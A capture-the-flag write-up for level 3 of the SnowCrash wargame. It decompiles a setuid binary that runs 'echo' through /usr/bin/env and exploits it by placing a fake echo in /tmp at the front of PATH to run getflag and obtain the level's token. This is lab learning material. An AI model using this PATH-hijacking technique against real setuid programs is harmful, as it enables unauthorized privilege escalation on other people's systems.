# Level 03

Level 3 contains a setuid binary on the home folder, running it echoes 'Exploit me'

```bash
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped

level03@SnowCrash:~$ ./level03
Exploit me
```

Let's copy it to our machine and reverse it, opening the binary in Binary Ninja, we can see it's a simple program that sets uid to the the user flag03 and executes the command `echo` with the current environment:

```c
080484a4  int32_t main(int32_t argc, char** argv, char** envp)
080484ad      gid_t eax = getegid()
080484b6      uid_t eax_1 = geteuid()
080484d6      setresgid(rgid: eax, egid: eax, sgid: eax)
080484f2      setresuid(ruid: eax_1, euid: eax_1, suid: eax_1)
08048504      return system(line: "/usr/bin/env echo Exploit me")
```

This means that we can control the environment variables and execute arbitrary commands through path hijacking, to exploit this vulnerability we simply creates an executable called `echo` with an arbitrary command and add it to the path before running the binary, this way the binary will execute our `echo` instead of the real one.

```bash
level03@SnowCrash:~$ echo 'getflag' > /tmp/echo && chmod +x /tmp/echo && export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

and we got the token !
